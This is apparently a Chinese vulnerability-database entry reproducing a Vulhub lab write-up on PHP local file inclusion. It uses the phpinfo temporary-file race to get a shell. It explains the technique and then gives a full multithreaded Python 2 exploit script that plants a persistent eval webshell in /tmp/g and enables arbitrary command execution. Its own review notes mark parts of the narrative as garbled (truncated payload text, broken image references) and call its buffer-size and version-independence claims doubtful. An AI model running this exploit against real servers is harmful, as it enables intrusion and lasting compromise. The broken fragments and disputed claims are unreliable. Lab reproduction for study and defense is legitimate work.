---
source: "hatch 补库批 20260928"
product: "PHP/LFI与phpinfo竞争"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Php文件包含漏洞（利用phpinfo）"
prerequisites: "来源所述条件，未列明部分仍待核：PHP7.2称官方最新版过时且不能推出版本无关"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7306ea6d87a8440cb19dbf4f"
entity_id: "ve-7306ea6d87a8440cb19dbf4f"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：PHP7.2称官方最新版过时且不能推出版本无关

代码与实验材料：完整脚本与298同源，写/tmp/g持久后门、100线程最多1000次；叙述载荷缺失

来源证据范围：Vulhub原文直接链接，hatch来源只导入批次

- **代码与转录边界（1）**：核心代码及图片转录破坏；依据：叙述会执行只剩')?&gt;，结果仅/media/rId27.png)残串。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（2）**：缓冲与版本结论沿袭错误；依据：4096缓冲等同socket每次输出、单一7.2实验等同全版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Php文件包含漏洞（利用phpinfo）

一、漏洞简介
------------

PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

二、漏洞影响
------------

三、复现过程
------------

### 环境搭建

执行如下命令启动环境：

    docker-compose up -d

目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。

环境启动后，访问`http://www.0-sec.org/phpinfo.php`即可看到一个PHPINFO页面，访问`http://www.0-sec.org:8080/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。

### 漏洞分析

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

这个时候就需要用到条件竞争，具体流程如下：

1.  发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
2.  因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大
3.  php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
4.  所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包
5.  此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
6.  利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

### 漏洞复现

利用脚本实现上述过程，成功包含临时文件后，会执行`')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。

用python2执行：`python exp.py www.0-sec.org 8080 100`：/media/rId27.png)

可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：/media/rId28.png)

### poc

    #!/usr/bin/python 
    import sys
    import threading
    import socket

    def setup(host, port):
        TAG="Security Test"
        PAYLOAD="""%s\r
    <?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
        REQ1_DATA="""-----------------------------7dbff1ded0714\r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
    Content-Type: text/plain\r
    \r
    %s
    -----------------------------7dbff1ded0714--\r""" % PAYLOAD
        padding="A" * 5000
        REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
    Cookie: PHPSESSID=q24********************n42; othercookie="""+padding+"""\r
    HTTP_ACCEPT: """ + padding + """\r
    HTTP_USER_AGENT: """+padding+"""\r
    HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
    HTTP_PRAGMA: """+padding+"""\r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
    Content-Length: %s\r
    Host: %s\r
    \r
    %s""" %(len(REQ1_DATA),host,REQ1_DATA)
        #modify this to suit the LFI script   
        LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
    User-Agent: Mozilla/4.0\r
    Proxy-Connection: Keep-Alive\r
    Host: %s\r
    \r
    \r
    """
        return (REQ1, TAG, LFIREQ)

    def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

        s.connect((host, port))
        s2.connect((host, port))

        s.send(phpinforeq)
        d = ""
        while len(d) < offset:
            d += s.recv(offset)
        try:
            i = d.index("[tmp_name] =&gt; ")
            fn = d[i+17:i+31]
        except ValueError:
            return None

        s2.send(lfireq % (fn, host))
        d = s2.recv(4096)
        s.close()
        s2.close()

        if d.find(tag) != -1:
            return fn

    counter=0
    class ThreadWorker(threading.Thread):
        def __init__(self, e, l, m, *args):
            threading.Thread.__init__(self)
            self.event = e
            self.lock =  l
            self.maxattempts = m
            self.args = args

        def run(self):
            global counter
            while not self.event.is_set():
                with self.lock:
                    if counter >= self.maxattempts:
                        return
                    counter+=1

                try:
                    x = phpInfoLFI(*self.args)
                    if self.event.is_set():
                        break                
                    if x:
                        print "\nGot it! Shell created in /tmp/g"
                        self.event.set()
                        
                except socket.error:
                    return
        

    def getOffset(host, port, phpinforeq):
        """Gets offset of tmp_name in the php output"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        s.send(phpinforeq)
        
        d = ""
        while True:
            i = s.recv(4096)
            d+=i        
            if i == "":
                break
            # detect the final chunk
            if i.endswith("0\r\n\r\n"):
                break
        s.close()
        i = d.find("[tmp_name] =&gt; ")
        if i == -1:
            raise ValueError("No php tmp_name in phpinfo output")
        
        print "found %s at %i" % (d[i:i+10],i)
        # padded up a bit
        return i+256

    def main():
        
        print "LFI With PHPInfo()"
        print "-=" * 30

        if len(sys.argv) < 2:
            print "Usage: %s host [port] [threads]" % sys.argv[0]
            sys.exit(1)

        try:
            host = socket.gethostbyname(sys.argv[1])
        except socket.error, e:
            print "Error with hostname %s: %s" % (sys.argv[1], e)
            sys.exit(1)

        port=80
        try:
            port = int(sys.argv[2])
        except IndexError:
            pass
        except ValueError, e:
            print "Error with port %d: %s" % (sys.argv[2], e)
            sys.exit(1)
        
        poolsz=10
        try:
            poolsz = int(sys.argv[3])
        except IndexError:
            pass
        except ValueError, e:
            print "Error with poolsz %d: %s" % (sys.argv[3], e)
            sys.exit(1)

        print "Getting initial offset...",  
        reqphp, tag, reqlfi = setup(host, port)
        offset = getOffset(host, port, reqphp)
        sys.stdout.flush()

        maxattempts = 1000
        e = threading.Event()
        l = threading.Lock()

        print "Spawning worker pool (%d)..." % poolsz
        sys.stdout.flush()

        tp = []
        for i in range(0,poolsz):
            tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

        for t in tp:
            t.start()
        try:
            while not e.wait(1):
                if e.is_set():
                    break
                with l:
                    sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                    sys.stdout.flush()
                    if counter >= maxattempts:
                        break
            print
            if e.is_set():
                print "Woot!  \m/"
            else:
                print ":("
        except KeyboardInterrupt:
            print "\nTelling threads to shutdown..."
            e.set()
        
        print "Shuttin' down..."
        for t in tp:
            t.join()

    if __name__=="__main__":
        main()

参考链接
--------

> https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md
